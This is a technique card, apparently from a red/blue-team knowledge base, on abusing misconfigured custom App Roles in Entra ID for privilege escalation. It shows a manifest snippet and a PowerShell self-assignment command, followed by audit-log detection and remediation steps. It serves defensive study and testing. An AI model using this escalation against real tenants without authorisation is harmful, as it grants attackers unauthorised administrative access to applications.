# [PE-ELEVATE-004]: Custom API RBAC Bypass (App Roles)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-004 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (Custom Apps) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Custom Applications in Entra ID often define their own "App Roles" (e.g., `Admin`, `User`, `Approver`) in their Manifest. Developers sometimes misconfigure these roles by setting `allowedMemberTypes` to include `User` but failing to restrict *who* can assign them. If the "User Assignment Required" flag is OFF on the Service Principal, or if users have `AppRoleAssignment.ReadWrite.All` (see PE-ELEVATE-005), they can self-assign these high-privilege application roles.
- **Attack Surface:** App Manifests.
- **Business Impact:** **App-Specific Admin Access**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User with `AppRoleAssignment.ReadWrite.All` or Application Owner.
- **Tools:**
    - Azure Portal / Graph Explorer

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Inspect Manifest**
Check target app's roles.
```json
"appRoles": [
  {
    "allowedMemberTypes": ["User"],
    "displayName": "SuperAdmin",
    "id": "1234...",
    "value": "Admin"
  }
]
```

**Step 2: Assign Role**
Assign the `SuperAdmin` role to yourself.
```powershell
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <TargetAppSP_ID> -PrincipalId <MyID> -ResourceId <TargetAppSP_ID> -AppRoleId <RoleID>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Add app role assignment to user` | User granting *themselves* an app role. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Assignment Requirement:** Ensure "Assignment Required" is set to YES on the Enterprise Application.
*   **Restrict Owners:** Don't make end-users owners of sensitive applications.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-ACCTMGMT-001]
> **Next Logical Step:** [PE-ELEVATE-008]
